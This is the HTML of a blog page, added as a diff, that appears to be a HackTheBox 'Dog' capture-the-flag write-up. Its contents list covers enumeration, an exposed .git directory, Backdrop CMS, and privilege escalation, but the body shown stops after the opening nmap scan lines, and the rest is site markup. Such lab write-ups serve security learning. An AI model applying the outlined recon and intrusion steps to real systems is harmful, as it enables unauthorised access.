@@ -1,0 +1,1883 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Hackthebox - Dog &middot; Re-toor</title>
+    <meta name="title" content="Hackthebox - Dog &middot; Re-toor">
+  
+
+  
+  
+  
+    <meta name="keywords" content="backdrop,git,ssh,bee - backdrop,linux,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/ctf/hackthebox/dog/">
+  
+
+  
+  
+    <meta name="author" content="TAH">
+  
+  
+    
+      
+        
+          <link href="https://github.com/re-toor" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/ha-tuan-anh" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/ctf/hackthebox/dog/">
+  <meta property="og:site_name" content="Re-toor">
+  <meta property="og:title" content="Hackthebox - Dog">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2025-04-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-01T00:00:00+00:00">
+    <meta property="article:tag" content="Backdrop">
+    <meta property="article:tag" content="Git">
+    <meta property="article:tag" content="Ssh">
+    <meta property="article:tag" content="Bee - Backdrop">
+    <meta property="article:tag" content="Linux">
+    <meta property="og:image" content="http://localhost:1313/ctf/hackthebox/dog/feature.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/ctf/hackthebox/dog/feature.png">
+  <meta name="twitter:title" content="Hackthebox - Dog">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+    <meta name="google-site-verification" content="1SrZKSHd82TJBbAQUQHiETfCL9gFqP0JneGjCV7VgHk">
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.dee52a50de99867dcf702b61813409684375e1531029925e3bf93a18ce5e9b90966dda9f19fd79daeca29df901c7b5408766f123540a0db92714d31fe7c3bdb1.css"
+    integrity="sha512-3uUqUN6Zhn3PcCthgTQJaEN14VMQKZJeO/k6GM5em5CWbdqfGf152uyinfkBx7VAh2bxI1QKDbknFNMf58O9sQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
+      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Ctf",
+    "name": "Hackthebox - Dog",
+    "headline": "Hackthebox - Dog",
+    
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/ctf/hackthebox/dog/",
+    "author" : {
+      "@type": "Person",
+      "name": "TAH"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-04-01T00:00:00\u002b00:00",
+    "datePublished": "2025-04-01T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-04-01T00:00:00\u002b00:00",
+    
+    "keywords": ["backdrop","git","ssh","bee - backdrop","linux"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2874"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "HackTheBox",
+            "item": "http://localhost:1313/ctf/hackthebox/"
+          },{
+            "@type": "ListItem",
+            "position":  2 ,
+            "name": "Ctf",
+            "item": "http://localhost:1313/ctf/"
+          },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "name": "Hackthebox - Dog",
+        "item": "http://localhost:1313/ctf/hackthebox/dog/"
+      }
+    ]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Re-toor
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/blog/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog"
+      title="Blog">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/soc/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="SOC"
+      title="SOC">
+      
+      
+        <span class="text-base font-medium break-normal">
+          SOC
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <div class="nested-menu">
+      <div class="cursor-pointer flex items-center">
+        <a
+          
+            href="/ctf/"
+            
+          
+          aria-label="CTF"
+          class="flex items-center text-base font-medium bf-icon-color-hover"
+          title="Ctf">
+          
+          <span class="text-bg font-bg break-normal" title="Ctf">
+            CTF
+          </span>
+          <span>
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </span>
+        </a>
+      </div>
+      <div class="menuhide">
+        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
+          <div class="flex flex-col space-y-3">
+            
+              <a
+                href="/ctf/hackthebox/"
+                
+                aria-label="HackTheBox"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="HackTheBox">
+                  HackTheBox
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/tryhackme/"
+                
+                aria-label="TryHackMe"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="TryHackMe">
+                  TryHackMe
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/selfdev/"
+                
+                aria-label="Self-dev"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Self-dev">
+                  Self-dev
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  
+
+    
+      
+  
+    <a
+      href="/about/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="About"
+      title="About">
+      
+      
+        <span class="text-base font-medium break-normal">
+          About
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/blog/"
+        aria-label="Blog"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Blog" class="text-2xl font-bold tracking-tight">
+          Blog
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/soc/"
+        aria-label="SOC"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="SOC" class="text-2xl font-bold tracking-tight">
+          SOC
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/ctf/"
+        aria-label="CTF"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Ctf" class="text-2xl font-bold tracking-tight">
+          CTF
+        </span>
+        
+          <label
+            for="fullscreen-submenu-ctf"
+            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </label>
+        
+      </a>
+
+      
+        <input checked type="checkbox" id="fullscreen-submenu-ctf" autocomplete="off" class="hidden peer/full">
+
+        <div
+          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
+          <div class="overflow-hidden">
+            <div class="ms-7 mt-4">
+              
+                <a
+                  href="/ctf/hackthebox/"
+                  aria-label="HackTheBox"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="HackTheBox" class="text-lg">
+                    HackTheBox
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/tryhackme/"
+                  aria-label="TryHackMe"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="TryHackMe" class="text-lg">
+                    TryHackMe
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/selfdev/"
+                  aria-label="Self-dev"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Self-dev" class="text-lg">
+                    Self-dev
+                  </span>
+                </a>
+              
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/about/"
+        aria-label="About"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="About" class="text-2xl font-bold tracking-tight">
+          About
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/ctf/hackthebox/dog/feature_hu_8da2d2d4193fd8a1.png"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/ctf/hackthebox/dog/feature_hu_8da2d2d4193fd8a1.png"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Hackthebox - Dog
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-04-01T00:00:00&#43;00:00">1 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>2874 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">14 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
+    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a>
+      <ul>
+        <li><a href="#vhost-directories">Vhost, directories</a></li>
+        <li><a href="#git">.git</a></li>
+        <li><a href="#backdrop-cms">Backdrop CMS</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
+    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a>
+      <ul>
+        <li><a href="#vhost-directories">Vhost, directories</a></li>
+        <li><a href="#git">.git</a></li>
+        <li><a href="#backdrop-cms">Backdrop CMS</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h2 class="relative group">Reconnaissance and Scanning
+    <div id="reconnaissance-and-scanning" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconnaissance-and-scanning" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 <span class="o">(</span>RSA<span class="o">)</span>
